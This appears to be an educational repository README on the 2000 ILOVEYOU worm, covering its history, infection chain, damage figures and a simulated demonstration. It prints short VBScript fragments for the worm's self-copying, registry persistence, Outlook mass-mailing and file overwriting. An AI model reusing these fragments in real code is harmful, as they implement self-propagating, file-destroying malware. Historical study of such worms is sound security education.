# 💌 ILOVEYOU Worm (2000)

> **The worm that spread through love — ~45 million computers infected in 10 days**

<div align="center">

![ILOVEYOU](https://img.shields.io/badge/ILOVEYOU-Worm-red?style=for-the-badge&logo=virus)
[![Release Date](https://img.shields.io/badge/Released-May%204%2C%202000-red?style=flat-square)]()
[![Author](https://img.shields.io/badge/Author-Unknown%20(attributed)-lightgrey?style=flat-square)]()
[![Damage](https://img.shields.io/badge/Damage-%245--8%20billion-orange?style=flat-square)]()

</div>

---

## 📊 Quick Stats

| Attribute | Value |
|-----------|-------|
| 📅 Release Date | May 4, 2000 |
| 👤 Author | Unknown (attributed to Onel de Guzman / Reonel Ramones) |
| 💥 Infected | ~45 million computers (10% of world's computers) |
| 💰 Damage | $5-8 billion USD |
| 🌍 Spread | Global, within 10 days |
| 🖥️ Platform | Windows 95/98 (VBScript) |
| ⏱️ Detection Time | ~24 hours |
| 📧 Propagation | Email via Outlook Address Book |

---

## 🔍 Attack Vector

```
┌─────────────────────────────────────────────────────────────┐
│                    INFECTION CHAIN                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  📧 Email: "ILOVEYOU"                                       │
│     │                                                       │
│     ├─ Subject: "ILOVEYOU"                                  │
│     ├─ Attachment: "LOVE-LETTER-FOR-YOU.TXT.vbs"            │
│     │   └─ Double extension trick                           │
│     │   └─ Windows hid .vbs by default                      │
│     │                                                       │
│     ▼                                                       │
│  👤 User double-clicks (thinks it's a .txt file)            │
│     │                                                       │
│     ▼                                                       │
│  💻 VBScript executes under Windows Script Host             │
│     │                                                       │
│     ├─ 1️⃣ Copies itself to system directories              │
│     ├─ 2️⃣ Modifies registry for persistence                │
│     ├─ 3️⃣ Emails itself to all Outlook contacts            │
│     ├─ 4️⃣ Overwrites media/image files                     │
│     └─ 5️⃣ Infects mIRC chat client                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🧬 Technical Breakdown

### Phase 1: Self-Replication 📋

```vbscript
Set fso = CreateObject("Scripting.FileSystemObject")
sysDir = fso.GetSpecialFolder(1) ' System folder
fso.CopyFile WScript.ScriptFullName, sysDir & "\MSKernel32.vbs", True
```

**Concept:** Copied itself to Windows system directories to survive beyond the initial email attachment.

### Phase 2: Registry Persistence 🔧

```vbscript
shell.RegWrite "HKLM\...\Run\MSKernel32", sysDir & "\MSKernel32.vbs"
```

**Concept:** Added itself to `CurrentVersion\Run` registry key for automatic execution on every boot.

### Phase 3: Email Propagation 📧

```vbscript
Set outlook = CreateObject("Outlook.Application")
Set contacts = outlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries
For Each contact In contacts
    Set mail = outlook.CreateItem(0)
    mail.Subject = "ILOVEYOU"
    mail.Attachments.Add(WScript.ScriptFullName)
    mail.Send  ' No user confirmation!
Next
```

**Concept:** Outlook allowed programmatic email sending without confirmation. The worm sent itself to every contact automatically.

### Phase 4: File Destruction 💥

```vbscript
fso.CopyFile WScript.ScriptFullName, file.Path, True
file.Name = file.Name & ".vbs"
```

**Concept:** Overwrote media and document files (.mp3, .jpg, .doc, etc.) with copies of itself, permanently destroying originals.

### Phase 5: mIRC Infection 💬

```vbscript
If fso.FolderExists("C:\mIRC") Then
    ' Creates script.ini that auto-sends worm to chat contacts
End If
```

**Concept:** Extended propagation beyond email by targeting the popular mIRC chat client.

---

## 📁 Source Files

| File | Description |
|------|-------------|
| [`LOVE-LETTER-FOR-YOU.vbs.educational`](LOVE-LETTER-FOR-YOU.vbs.educational) | Annotated VBScript source code |
| [`run_simulation.bat`](run_simulation.bat) | Easy runner for safe simulation |
| [`iloveyou_educational_log.txt`](iloveyou_educational_log.txt) | Sample output log |

---

## ⚙️ How to Run

**Option 1: Batch file (easiest)**
```bash
cd iloveyou_worm
run_simulation.bat
```

**Option 2: Direct via temp copy**
```bash
copy LOVE-LETTER-FOR-YOU.vbs.educational %TEMP%\iloveyou_edu.vbs
cscript //nologo %TEMP%\iloveyou_edu.vbs
```

> ⚠️ The `.educational` extension prevents accidental execution. A temporary `.vbs` copy is needed to run.

---

## 📊 Sample Output

```
============================================
EDUCATIONAL ILOVEYOU WORM DEMONSTRATION
Date: 5/4/2026 6:20:30 AM
============================================
--- PHASE 1: Self-Replication ---
[SIMULATED] Would copy to C:\Windows\System32\MSKernel32.vbs
[SIMULATED] Would copy to C:\Windows\WinFilesystem.vbs
--- PHASE 2: Persistence ---
[SIMULATED] Would write registry key: HKLM\...\Run\MSKernel32
--- PHASE 3: Email Propagation ---
[SIMULATED] Would enumerate Outlook address book
[SIMULATED] Would send emails to all contacts
EMAIL SUBJECT: ILOVEYOU
EMAIL BODY: kindly check the attached LOVE LETTER😍
ATTACHMENT: LOVE-LETTER-FOR-YOU.TXT.vbs
--- PHASE 4: File Destruction ---
TARGET EXTENSIONS: .mp3, .mp2, .wav, .avi, .mov, .jpg, .jpeg, .png, .gif, .css, .js, .vbs, .doc, .xls
⚠️ ORIGINAL WORM: OVERWROTE these files with copies of itself
--- PHASE 5: mIRC Infection ---
[SIMULATED] Would check for mIRC installation at: C:\Windows\mIRC
============================================
DEMONSTRATION COMPLETE
============================================
```

---

## 🛡️ Vulnerabilities Exploited

| Vulnerability | Impact | Fixed |
|--------------|--------|-------|
| Social engineering | Users clicked romantic subject line | Awareness training |
| Hidden file extensions | `.vbs` hidden, looked like `.txt` | Visible extensions by default |
| Outlook auto-send | No confirmation for programmatic emails | Security prompts added |
| VBScript auto-execution | No warnings by default | Script controls tightened |
| No attachment scanning | Email providers didn't scan attachments | Universal scanning deployed |

---

## 📚 Further Reading

- [FBI Investigation Notes](https://vault.fbi.gov)
- [CERT Advisory CA-2000-04](https://www.cert.org)
- [Microsoft Security Advisory](https://www.microsoft.com/security)

---

<div align="center">

⚠️ **EDUCATIONAL ONLY** — All destructive operations simulated

</div>
